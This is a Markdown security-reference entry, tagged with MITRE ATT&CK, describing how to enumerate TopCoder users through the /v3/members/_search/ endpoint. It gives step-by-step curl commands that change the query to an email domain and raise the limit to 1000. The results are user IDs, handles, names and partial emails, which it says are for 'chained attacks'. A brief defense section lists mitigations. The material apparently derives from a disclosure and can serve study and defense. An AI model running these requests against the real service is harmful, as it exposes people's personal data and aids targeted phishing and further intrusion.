---
tags:
  - information-disclosure
  - account-discovery
  - api-enumeration
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/topcoder-member-search-enumerate]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:25:17.375Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 01e29960-8369-43e1-ba14-16e8b0e506fd
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
---
# Enumerate-User-IDs-via-Member-Search-Endpoint

## Summary

This procedure exploits insufficient access controls on the TopCoder /v3/members/_search/ endpoint to perform broad user enumeration by email domain, retrieving user IDs, handles, names, and partial emails for up to 1000 users without proper authentication restrictions.

## Description

In the TopCoder platform, the member search API allows manipulation of query parameters to conduct database-like searches. By intercepting legitimate search requests during project invitations and altering the query to target email domains (e.g., @company.com), attackers can enumerate internal users. This is particularly dangerous for disclosing admin or employee accounts, aiding in further social engineering or targeted attacks. Prerequisites include a valid session token and proxy interception tool like Burp Suite.

## Requirements

1. Authenticated TopCoder session with Authorization Bearer token
2. Access to https://api.topcoder.com
3. Burp Suite or equivalent proxy for request manipulation
4. Knowledge of target email domains for enumeration

## Defense

Defensive measures and detection strategies:

- Implement strict authentication and rate limiting on search endpoints
- Validate and sanitize query parameters to prevent broad searches
- Monitor for anomalous API queries with high limit values or domain patterns
- Use API gateways to enforce authorization on all user data retrievals

## Objectives

1. Enumerate user IDs and basic profile data by email domain
2. Collect handles and names for reconnaissance
3. Prepare data for PII disclosure in chained attacks

## Instructions

### Step 1: Intercept Baseline Search Request

**Context**: Trigger a normal search to capture the request structure.

**Command** ([[commands/topcoder-member-search-enumerate]]):

In Burp Suite, intercept the GET request during invitation form submission.

```bash
# Baseline curl equivalent (before manipulation)
curl -X GET "https://api.topcoder.com/v3/members/_search/?fields=userId,handle&query=handle:example" \
  -H "Authorization: Bearer YOUR_TOKEN"
```

> This captures the initial request; expected output is a single user match.

### Step 2: Manipulate Query for Domain Enumeration

**Context**: Alter parameters to broaden the search and retrieve multiple users.

**Command** ([[commands/topcoder-member-search-enumerate]]):

Modify query to email domain and increase limit.

```bash
curl -X GET "https://api.topcoder.com/v3/members/_search/?fields=userId,handle,photoURL,firstName,lastName,details,email&query=email:@wearehackerone.com&limit=1000" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Accept: application/json"
```

> Returns JSON array of up to 1000 users; parse for userIds.

### Step 3: Parse and Store Results

**Context**: Extract user IDs for use in subsequent steps.

**Command**:

Use jq or similar to filter userIds.

```bash
curl ... | jq '.[].userId' > user_ids.txt
```

> Output: List of numeric user IDs.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/topcoder-member-search-enumerate]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- information-disclosure
- account-discovery
- api-enumeration
